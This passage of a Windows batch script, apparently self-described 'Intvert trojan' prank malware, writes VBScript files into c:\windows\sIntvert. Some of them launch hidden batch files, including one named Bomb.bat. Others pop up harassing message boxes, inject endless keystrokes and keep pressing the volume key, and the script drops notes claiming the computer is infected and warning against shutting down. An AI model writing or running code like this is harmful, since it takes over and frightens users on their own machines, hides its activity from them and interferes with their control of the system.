  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >BunDem.vbs
( echo x=msgbox("Your laptop is mostly happily happy !",48,"Yes"^)) >M1.vbs
( echo x=msgbox("Still using this computer?",48,"No Shit"^)) >M2.vbs
( echo x=msgbox("Lemon mixed with milk",48,"Vinesause?"^)) >M3.vbs
( echo x=msgbox("HIT ME AGAIN GODDAMMIT",48,"Ghost"^)) >M0.vbs
( echo x=msgbox("Rest in Piss Forever Miss",48," "^)) >End.vbs
( echo x=msgbox("Naughty Boy",48," "^)) >naughty1.vbs
( echo x=msgbox("You didn't let me finnish",48," "^)) >naughty2.vbs
( echo x=msgbox("Lets try again",48," "^)) >naughty3.vbs
:: The below scripts make the cmd windows not appear as visable when lauched
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "c:\windows\sIntvert\a.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S1.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "c:\windows\sIntvert\b.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S2.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "c:\windows\sIntvert\c.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S3.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "c:\windows\sIntvert\d.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S4.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "c:\windows\sIntvert\e.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S5.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "c:\windows\sIntvert\f.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S6.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "c:\windows\sIntvert\g.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S7.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "c:\windows\sIntvert\Bomb.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S8.vbs
( echo Set WshShell = CreateObject(" WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "c:\windows\sIntvert\h.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S9.vbs
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "c:\windows\sIntvert\idla.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >S10.vbs
cd %userprofile%
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "c:\windows\sIntvert\date.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >SystemProc.vbs
cd c:\windows\sIntvert
( echo Set wshShell =wscript.CreateObject^("WScript.Shell"^)
  echo do
  echo wscript.sleep 100
  echo wshshell.sendkeys "{H}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{I}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{T}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{-}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{M}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{E}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{-}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{A}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{G}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{A}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{I}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{N}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{!}"
  echo wscript.sleep 10
  echo wshshell.sendkeys "{-}"
  echo loop) >kes.vbs
( echo do
  echo Set WshShell = CreateObject("WScript.Shell"^)
  echo wscript.sleep 10
  echo WshShell.SendKeys(chr(^&hAF^)^)
  echo loop) >v.vbs
::--------------------TXT---------------------------
cd %userprofile%\Documents
( echo Your computer has now been infected by the Intvert tojan.
  echo Have fun trying to use your computer, it won't last long.
  echo.
  echo Shutting down won't stop anything and actialy has a chance
  echo of harming your system, so don't.
  echo Enjoy :D) >Yes.txt
( echo Your computer hasn't been trashed any tojan
  echo.
  echo This program isn't harmfull, its just made to scare/prank you.
  echo The program changes some regestry keys, to revert this a 
  echo .exe has been made on the desktop to reset the regkeys and
  echo everything else that was changed in the process. 
  echo Don't delete the .exe until use otherwise there will be no way to 
  echo revert changed reg keys, unless done manually.
  echo.
  echo But since your still here we might aswell give you a show) >GiveItASec.txt
cd c:\windows\sIntvert
goto indone
